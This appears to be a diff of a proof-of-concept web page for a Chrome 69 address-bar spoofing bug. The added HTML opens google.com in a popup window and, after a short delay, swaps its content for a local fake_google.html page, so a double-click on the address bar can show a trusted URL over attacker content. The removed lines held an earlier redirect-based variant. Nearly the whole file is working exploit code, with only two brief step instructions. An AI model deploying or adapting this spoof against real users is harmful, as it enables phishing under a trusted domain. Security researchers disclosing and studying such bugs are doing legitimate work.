@@ -1,5 +1,18 @@
-<script>  
-location.href = "tg:1"  
-//location.href = "tel:1"  
-setTimeout('location.href = "https://apple.com"', 500)  
-</script>  
+ <html>
+    <head>
+        <title>Chrome 69 Double-click URL Spoof - evi1m0.bat[at]gmail.com</title>
+    </head>
+    <body>
+        <li>step1: click button</li>
+        <li>step2: double click the address bar of the new window</li>
+        <br>
+        <button onclick="pwn()">clickme</button>
+
+        <script>
+            var pwn = () => {
+                win = window.open("https://google.com", "test", "width=400 height=400");
+                setTimeout("win.location = './fake_google.html'", 4000);
+            }
+        </script>
+    </body>
+    </html>
